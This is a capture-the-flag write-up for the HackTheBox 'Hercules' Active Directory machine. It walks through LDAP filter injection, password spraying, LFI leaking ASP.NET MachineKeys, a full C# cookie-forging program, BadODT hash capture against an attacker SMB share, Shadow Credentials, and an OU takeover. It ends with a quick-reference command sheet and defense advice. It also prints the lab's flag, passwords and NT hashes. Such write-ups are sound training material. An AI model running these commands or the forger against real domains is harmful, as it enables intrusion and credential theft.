# HTB - Hercules - 10.10.11.91

## Hercules

> **Platform:** HackTheBox **Difficulty:** Hard **OS:** Windows (Active Directory) **Key Techniques:** Kerberos User Enumeration, LDAP Filter Injection, LFI, ASP.NET Cookie Forgery, BadODT (NetNTLMv2 Capture), Shadow Credentials, OU Takeover, RBCD, BloodHound ACL Analysis

***

### Box Info

| Property   | Value                              |
| ---------- | ---------------------------------- |
| IP         | `10.10.11.91`                      |
| Hostname   | DC                                 |
| FQDN       | `dc.hercules.htb`                  |
| Domain     | `hercules.htb`                     |
| OS         | Windows Server (IIS 10.0)          |
| CA         | CA-HERCULES                        |
| Difficulty | Hard                               |
| User Flag  | `b4f917e0d3cdaabec94d37f3e54218a1` |

***

### Domain Information

| Property    | Value                                   |
| ----------- | --------------------------------------- |
| Domain      | hercules.htb                            |
| DC FQDN     | dc.hercules.htb                         |
| CA          | CA-HERCULES (hercules domain component) |
| SMB Signing | Enabled and Required                    |
| WinRM       | Port 5986 (SSL only)                    |

***

### Attack Chain Overview

```
Kerbrute (33 users) → LDAP Filter Injection (johnathan.j password in description) →
Password Spray → ken.w with shared default password →
IIS Web App (ken.w login) → LFI in PDF download → web.config leaked (MachineKeys) →
ASP.NET FormsAuth Cookie Forgery (web_admin) → File Upload → BadODT →
NetNTLMv2 Capture (natalie.a) → Hash Cracking →
BloodHound: natalie.a → GenericWrite on bob.w → Shadow Credentials → bob.w NT hash →
bloodyAD: bob.w has CREATE_CHILD on OUs + WRITE msDS-AllowedToActOnBehalfOfOtherIdentity on bob.w →
Move auditor to Web Department OU (inherit permissions) → Shadow Credentials on auditor →
WinRM as auditor → User Flag
```

***

### Reconnaissance

#### Nmap Scan

**Full TCP port scan with aggressive detection:**

```bash
nmap -p- -A -sCV -PN -vvv 10.10.11.91 -oN nmap.tcp
```

| Port   | Service     | Details                                |
| ------ | ----------- | -------------------------------------- |
| 53     | DNS         | Simple DNS Plus                        |
| 80     | HTTP        | IIS 10.0 — Redirects to HTTPS          |
| 88     | Kerberos    | Microsoft Windows Kerberos             |
| 135    | MSRPC       | Microsoft Windows RPC                  |
| 139    | NetBIOS     | Microsoft Windows netbios-ssn          |
| 389    | LDAP        | AD LDAP (Domain: hercules.htb)         |
| 443    | HTTPS       | IIS 10.0 — "Hercules Corp"             |
| 445    | SMB         | microsoft-ds (signing required)        |
| 464    | kpasswd5    | Kerberos password change               |
| 593    | RPC/HTTP    | Microsoft Windows RPC over HTTP 1.0    |
| 636    | LDAPS       | AD LDAP (SSL)                          |
| 3268   | LDAP GC     | Global Catalog                         |
| 3269   | LDAPS GC    | Global Catalog (SSL)                   |
| 5986   | WinRM (SSL) | Microsoft HTTPAPI httpd 2.0            |
| 9389   | mc-nmf      | .NET Message Framing (AD Web Services) |
| 49664+ | MSRPC       | Various high-numbered RPC endpoints    |

**Key observations:**

* Full DC: DNS, Kerberos, LDAP, Global Catalog, SMB all present
* **IIS 10.0** on ports 80/443 — ASP.NET web application ("Hercules Corp")
* **WinRM only on 5986 (SSL)** — no plain 5985, must use `-ssl` flag
* **AD Certificate Services** present (CA-HERCULES in certificate issuer) — potential certificate abuse
* SMB signing is required — rules out relay attacks
* Two SSL certificates: one for `dc.hercules.htb` (issued by CA-HERCULES) and one self-signed for `hercules.htb`

***

### Foothold Phase 1 — Username Enumeration via Kerberos

With no credentials to start, we use Kerbrute to enumerate valid domain usernames against Kerberos (port 88).

**What is Kerbrute?**

Kerbrute exploits the fact that Kerberos returns different error codes for valid vs invalid usernames during AS-REQ pre-authentication. `KDC_ERR_PREAUTH_REQUIRED` means the user exists but needs a password; `KDC_ERR_C_PRINCIPAL_UNKNOWN` means the user doesn't exist. This allows username enumeration without triggering account lockouts.

```bash
kerbrute userenum -d hercules.htb --dc 10.10.11.91 names_ad_format.txt
```

**Result:** 33 valid usernames discovered, including: `adriana.i`, `angelo.o`, `ashley.b`, `bob.w`, `camilla.b`, `clarissa.c`, `elijah.m`, `fiona.c`, `harris.d`, `heather.s`, `jacob.b`, `jennifer.a`, `jessica.e`, `joel.c`, `johanna.f`, `johnathan.j`, `ken.w`, `mark.s`, `mikayla.a`, `natalie.a`, `nate.h`, `patrick.s`, `ramona.l`, `ray.n`, `rene.s`, `shae.j`, `stephanie.w`, `stephen.m`, `tanya.r`, `tish.c`, `vincent.g`, `will.s`, `zeke.s`.

***

### Foothold Phase 2 — LDAP Filter Injection

**What is LDAP Filter Injection?**

LDAP filter injection is similar to SQL injection but targets LDAP queries. If a web application constructs LDAP search filters using unsanitized user input, an attacker can manipulate the filter logic to extract data — such as the `description` field, which administrators sometimes use to store temporary passwords.

The web application's search functionality was vulnerable to LDAP injection, allowing character-by-character brute-force extraction of the `description` attribute for each user.

**Run the LDAP injection brute-force script:**

```bash
python3 bruteforce.py
```

**Result — Password found in description field:**

| Username    | Password (from description) |
| ----------- | --------------------------- |
| johnathan.j | `change*th1s_p@ssw()rd!!`   |

The password name itself suggests it's a **default/initial password** that was never changed — a common finding in enterprise environments.

#### Password Spraying

Since this looks like a default password, we spray it against all discovered users:

```bash
nxc ldap 10.10.11.91 -u usernames.txt -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k
```

**Result — Second user found with the same default password:**

| Username | Password                  | Protocol             |
| -------- | ------------------------- | -------------------- |
| ken.w    | `change*th1s_p@ssw()rd!!` | LDAP (Kerberos auth) |

***

### Foothold Phase 3 — Web Application Exploitation

#### LFI via PDF Download

Logging into the web application at `https://10.10.11.91/` as `ken.w`, we discover a PDF download feature. Intercepting the request with Burp reveals the server fetches files from internal paths.

**Testing for Local File Inclusion (LFI):**

By manipulating the file path parameter, we can read arbitrary files from the IIS server. The most valuable target is `web.config`, which contains the ASP.NET MachineKey:

**Extracted MachineKeys from web.config:**

| Key           | Value                                                                                                                              |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| validationKey | `EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80` |
| decryptionKey | `B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581`                                                                 |

#### ASP.NET Forms Authentication Cookie Forgery

**What is FormsAuth Cookie Forgery?**

ASP.NET Forms Authentication encrypts and signs authentication cookies using the `validationKey` and `decryptionKey` from `web.config`. If an attacker obtains these keys (via LFI, source code leak, etc.), they can forge a valid authentication cookie for **any user**, including administrative accounts like `web_admin`.

**Why this works:** The MachineKey is the single secret that protects cookie integrity and confidentiality. With both keys, we can create a `FormsAuthenticationTicket` for any username, encrypt it identically to how the server would, and the server will accept it as legitimate.

**Step 1: Create a .NET console project:**

```bash
dotnet new console -o LegacyAuthConsole
cd LegacyAuthConsole
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
dotnet restore
```

**Step 2: Replace Program.cs with the cookie forger:**

```csharp
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey =
            "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

        string decryptionKey =
            "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        // HMACSHA256 accepts max 128 hex chars (64 bytes)
        if (validationKey.Length > 128)
            validationKey = validationKey.Substring(0, 128);

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var ticket = new FormsAuthenticationTicket(
            1,                      // version
            "web_admin",            // target username
            issueDate,
            expiryDate,
            false,                  // persistent
            "Web Administrators",   // user data / role
            "/"                     // cookie path
        );

        var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        string encrypted = encryptor.Encrypt(ticket);
        Console.WriteLine("Encrypted FormsAuth Ticket:");
        Console.WriteLine(encrypted);
    }
}
```

**Step 3: Build and run:**

```bash
dotnet build
dotnet run
```

**Step 4:** Replace the `.ASPXAUTH` cookie in the browser with the forged value. The application now recognizes us as `web_admin`, granting access to the file upload functionality.

#### File Upload — BadODT for NetNTLMv2 Capture

**What is BadODT?**

BadODT is a technique where a crafted OpenDocument Text (`.odt`) file contains an embedded reference to a remote SMB share (similar to BadPDF). When the server processes the document, it attempts to authenticate to the attacker's SMB server, leaking NetNTLMv2 credentials.

As `web_admin`, we can now upload files. Testing allowed extensions:

| Extension | Allowed? |
| --------- | -------- |
| .pdf      | No       |
| .docx     | Yes      |
| .dot      | Yes      |
| .odt      | Yes      |

**Step 1: Generate a BadODT file that references our SMB server**

The ODT file contains an embedded link to `\\<ATTACKER_IP>\share`, causing the server to authenticate back.

**Step 2: Start Responder:**

```bash
sudo responder -I <INTERFACE>
```

**Step 3: Upload the BadODT file through the web interface**

**Result — Captured NetNTLMv2 hash:**

| Username    | Hash Type |
| ----------- | --------- |
| `natalie.a` | NetNTLMv2 |

**Step 4: Crack with John:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt natalie.hash
```

| Username  | Password             |
| --------- | -------------------- |
| natalie.a | `Prettyprincess123!` |

***

### Credential Summary (so far)

| Username    | Password / Hash                    | Source                             |
| ----------- | ---------------------------------- | ---------------------------------- |
| johnathan.j | `change*th1s_p@ssw()rd!!`          | LDAP injection (description field) |
| ken.w       | `change*th1s_p@ssw()rd!!`          | Password spray (default password)  |
| web\_admin  | Forged cookie (no password needed) | ASP.NET MachineKey from LFI        |
| natalie.a   | `Prettyprincess123!`               | BadODT → NetNTLMv2 → John          |

***

### Privilege Escalation Phase 1 — natalie.a → bob.w (Shadow Credentials)

#### BloodHound Analysis

```bash
bloodhound-python \
  -u natalie.a \
  -p 'Prettyprincess123!' \
  -d HERCULES.HTB \
  -ns 10.10.11.91 \
  -c All
```

**Key finding:** `natalie.a` has **GenericWrite** over `bob.w`.

#### What is Shadow Credentials?

Shadow Credentials is a technique that abuses the `msDS-KeyCredentialLink` attribute on an AD user object. When you have write access to a user (like GenericWrite), you can add a new Key Credential (a certificate) to their account. This certificate can then be used to request a TGT via PKINIT (Kerberos certificate-based authentication), which returns the user's NT hash as part of the PAC.

**Why use Shadow Credentials instead of just changing bob.w's password?** Changing a password is destructive and noisy — it locks the real user out. Shadow Credentials adds a certificate without modifying the password, allowing both the real user and the attacker to authenticate.

**Step 1: Get a TGT for natalie.a:**

```bash
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:'Prettyprincess123!'
export KRB5CCNAME=$(pwd)/natalie.a.ccache
```

**Step 2: Execute Shadow Credentials attack against bob.w:**

```bash
certipy shadow auto -u natalie.a@hercules.htb -k -account bob.w -target dc.hercules.htb
```

**Result:**

```
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

***

### Privilege Escalation Phase 2 — bob.w ACL Analysis (OU Takeover)

#### Enumerating bob.w's Permissions with bloodyAD

```bash
KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' \
  --host DC.hercules.htb get writable --detail
```

**Critical findings:**

| Target                   | Permission                                        | Significance                      |
| ------------------------ | ------------------------------------------------- | --------------------------------- |
| `CN=Bob Wood` (self)     | `msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE` | RBCD possible                     |
| `OU=Web Department`      | `CREATE_CHILD` (computer, user, etc.)             | Can create objects in this OU     |
| `OU=Security Department` | `CREATE_CHILD`                                    | Can create objects in this OU     |
| `CN=Auditor`             | `name: WRITE`, `cn: WRITE`                        | Basic attribute modification only |

#### Understanding the OU Takeover Strategy

**What is OU Permission Inheritance?**

In Active Directory, permissions flow downward through the organizational hierarchy:

```
Domain Root
  └── OU (Organizational Unit) ← Permissions set here
        └── User/Computer Objects ← Inherit parent OU permissions
```

When an object is inside an OU, it **inherits the ACLs** of that OU. If bob.w has `CREATE_CHILD` on the "Web Department" OU, any object created or moved into that OU may inherit more permissive ACLs — including write access to `msDS-KeyCredentialLink` (needed for Shadow Credentials).

**The problem:** The `auditor` account is in the "Security Department" OU where we only have `name` and `cn` write access. If we move `auditor` to the "Web Department" OU (where bob.w has extensive CREATE\_CHILD permissions), `auditor` will inherit the more permissive ACLs from that OU — giving us the ability to perform Shadow Credentials against `auditor`.

***

### Privilege Escalation Phase 3 — Move Auditor + Shadow Credentials

#### Step 1: Move auditor to Web Department OU

```bash
KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb \
  -k --use-ldaps --no-pass
```

Inside PowerView:

```
Set-DomainObjectDN -Identity auditor \
  -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

This moves the `auditor` object from the Security Department OU to the Web Department OU, where it inherits the more permissive ACLs controlled by bob.w.

#### Step 2: Shadow Credentials on auditor

Now that `auditor` is in the Web Department OU with inherited write permissions, we can perform Shadow Credentials:

```bash
KRB5CCNAME=natalie.a.ccache certipy shadow auto \
  -u natalie.a@hercules.htb -k \
  -target DC.hercules.htb \
  -account 'auditor'
```

**Result:**

```
[*] NT hash for 'auditor': a9285c625af80519ad784729655ff325
```

***

### User Flag — WinRM as Auditor

The `auditor` NT hash cannot be used directly for Pass-the-Hash with WinRM on this box. Instead, we use the Kerberos ccache obtained from the Shadow Credentials attack:

```bash
export KRB5CCNAME=auditor.ccache

python3 evil_winrmexec.py -ssl -port 5986 \
  -k -no-pass \
  hercules.htb/auditor@dc.hercules.htb
```

**Note:** WinRM is only available on port 5986 (SSL), requiring the `-ssl -port 5986` flags.

```
PS C:\Users\auditor\Desktop> type user.txt
b4f917e0d3cdaabec94d37f3e54218a1
```

***

### Quick Reference

```bash
# === USERNAME ENUMERATION ===
kerbrute userenum -d hercules.htb --dc 10.10.11.91 names_ad_format.txt

# === LDAP INJECTION ===
python3 bruteforce.py
# Found: johnathan.j:change*th1s_p@ssw()rd!!

# === PASSWORD SPRAY ===
nxc ldap 10.10.11.91 -u usernames.txt -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k
# Found: ken.w with same default password

# === COOKIE FORGERY ===
# 1. LFI to extract web.config (MachineKeys)
# 2. dotnet new console → AspNetCore.LegacyAuthCookieCompat
# 3. Forge cookie for web_admin → replace .ASPXAUTH in browser

# === BADODT + HASH CRACKING ===
sudo responder -I <INTERFACE>
# Upload crafted .odt via web_admin upload
john --wordlist=/usr/share/wordlists/rockyou.txt natalie.hash
# natalie.a:Prettyprincess123!

# === BLOODHOUND ===
bloodhound-python -u natalie.a -p 'Prettyprincess123!' -d HERCULES.HTB -ns 10.10.11.91 -c All

# === SHADOW CREDENTIALS (natalie.a → bob.w) ===
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:'Prettyprincess123!'
export KRB5CCNAME=$(pwd)/natalie.a.ccache
certipy shadow auto -u natalie.a@hercules.htb -k -account bob.w -target dc.hercules.htb

# === ACL ENUMERATION (bob.w) ===
KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' \
  --host DC.hercules.htb get writable --detail

# === OU TAKEOVER ===
KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --no-pass
# Set-DomainObjectDN -Identity auditor -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

# === SHADOW CREDENTIALS (→ auditor) ===
KRB5CCNAME=natalie.a.ccache certipy shadow auto -u natalie.a@hercules.htb -k \
  -target DC.hercules.htb -account 'auditor'
export KRB5CCNAME=auditor.ccache

# === WINRM ===
python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/auditor@dc.hercules.htb
```

***

### Troubleshooting

| Issue                                               | Solution                                                                                                                                                                                                                |
| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Kerbrute returns 0 valid users                      | Ensure DNS resolves `hercules.htb` to the target IP. Add to `/etc/hosts`. Verify the wordlist uses the correct naming format (e.g., `firstname.lastname`)                                                               |
| LDAP injection script hangs or returns no results   | The injection may require Kerberos auth (`-k`). Verify the injection point and character set in the script. Special characters in passwords (like `*`, `(`, `)`) may need URL/LDAP encoding                             |
| LFI doesn't return web.config                       | Try different path traversal patterns: `..\..\web.config`, `....//....//web.config`. IIS may normalize paths differently than Linux                                                                                     |
| Forged cookie rejected by the server                | Verify the `ShaVersion` matches the web.config's `validation` attribute (SHA256 in this case). Ensure the `validationKey` is trimmed to 128 hex chars for HMACSHA256. Check cookie name matches (typically `.ASPXAUTH`) |
| BadODT upload rejected                              | Only `.odt` extension is allowed for document types that trigger SMB callbacks. `.docx` is allowed but may not trigger the same embedded resource loading                                                               |
| Responder doesn't capture hash from ODT             | Ensure Responder is running on the correct interface. The server must be able to reach your IP on port 445. Check if the ODT properly references `\\<YOUR_IP>\share`                                                    |
| Shadow Credentials fails with "Insufficient rights" | Verify GenericWrite permission exists via BloodHound. The attack requires write access to `msDS-KeyCredentialLink`, which is included in GenericWrite but not in all WRITE permissions                                  |
| certipy shadow returns clock skew                   | Sync clock: `sudo ntpdate 10.10.11.91`. Kerberos has a 5-minute tolerance                                                                                                                                               |
| PowerView Set-DomainObjectDN fails                  | Ensure you're using LDAPS (`--use-ldaps`) as the DC may require encrypted LDAP for modifications. Verify bob.w has the rights to move objects between OUs                                                               |
| evil-winrm fails on port 5986                       | This box only has WinRM on 5986 (SSL). Standard evil-winrm may need `-S` flag. The writeup uses `evil_winrmexec.py` with `-ssl -port 5986` instead                                                                      |
| Pass-the-Hash doesn't work for auditor              | This box enforces Kerberos authentication. Use the ccache from certipy shadow instead of the NT hash directly                                                                                                           |

***

### Key Takeaways

**What we learned:**

1. **LDAP injection can extract sensitive data from AD attributes** — The `description` field is commonly misused to store temporary passwords. LDAP filter injection allows character-by-character extraction even without direct LDAP bind access
2. **Default passwords are a systemic risk** — The password found on `johnathan.j` was a domain-wide default, also valid for `ken.w`. Password spraying with discovered credentials should always be attempted
3. **ASP.NET MachineKeys are crown jewels** — LFI to `web.config` exposes the keys that protect authentication cookies. With these keys, any user identity can be forged without knowing their password
4. **BadODT/BadPDF are effective for credential capture** — Document formats that support embedded remote resource references (SMB paths) can capture NetNTLMv2 hashes when processed server-side
5. **Shadow Credentials is a non-destructive alternative to password changes** — When you have GenericWrite over a user, Shadow Credentials adds a certificate for PKINIT authentication without modifying the existing password
6. **OU placement determines effective permissions in AD** — Moving an object between OUs changes its inherited ACLs. An object with restrictive permissions in one OU may inherit permissive ones in another — this is the core of the OU takeover technique
7. **Kerberos-first environments require ticket-based authentication** — When NTLM is restricted or Pass-the-Hash is blocked, all authentication must flow through Kerberos ccache files and `-k` flags

**Attack chain summary:**

```
Kerbrute → LDAP Injection (johnathan.j) → Password Spray (ken.w) →
LFI (web.config MachineKeys) → Cookie Forgery (web_admin) →
BadODT → NetNTLMv2 (natalie.a) → Crack →
GenericWrite → Shadow Creds (bob.w) → ACL Enum →
OU Takeover (move auditor) → Shadow Creds (auditor) → WinRM → User
```

**Defense recommendations:**

* Never store passwords in LDAP `description` fields — use a proper credential management system and enforce password changes on first login
* Sanitize all user input in LDAP queries to prevent filter injection attacks
* Protect `web.config` from LFI — use IIS Request Filtering to block path traversal and restrict access to configuration files
* Rotate MachineKeys regularly and store them in a key vault rather than plaintext in `web.config`
* Restrict file upload to only required types and process uploaded documents in a sandboxed environment that cannot make outbound SMB connections
* Audit GenericWrite and other write permissions in AD — these are frequently overlooked and enable Shadow Credentials attacks
* Implement ACL inheritance auditing — monitor for objects being moved between OUs to detect OU takeover attempts
* Enable `msDS-KeyCredentialLink` change logging — detect Shadow Credentials attacks via Event ID 5136 (Directory Service Changes)
* Apply the principle of least privilege to OU delegations — `CREATE_CHILD` permissions should be scoped to specific object types, not blanket access
* Disable NTLM where possible and enforce Kerberos — while this box enforced it for defense, the same controls help prevent relay attacks

***

### Related Topics

* \[\[Kerberos User Enumeration]]
* \[\[Kerbrute]]
* \[\[LDAP Filter Injection]]
* \[\[ASP.NET MachineKey]]
* \[\[FormsAuthentication Cookie Forgery]]
* \[\[Local File Inclusion (LFI)]]
* \[\[BadODT]]
* \[\[NetNTLMv2 Capture]]
* \[\[Shadow Credentials]]
* \[\[Certipy]]
* \[\[BloodHound]]
* \[\[bloodyAD]]
* \[\[PowerView]]
* \[\[GenericWrite Abuse]]
* \[\[OU Takeover]]
* \[\[RBCD (Resource-Based Constrained Delegation)]]
* \[\[Active Directory ACL Abuse]]
* \[\[PKINIT]]

***

### Tags

`#active-directory` `#kerberos` `#ldap-injection` `#lfi` `#aspnet-cookie-forgery` `#machinekey` `#badodt` `#netntlmv2` `#shadow-credentials` `#certipy` `#bloodhound` `#bloodyad` `#genericwrite` `#ou-takeover` `#acl-abuse` `#rbcd` `#htb-hard` `#windows`
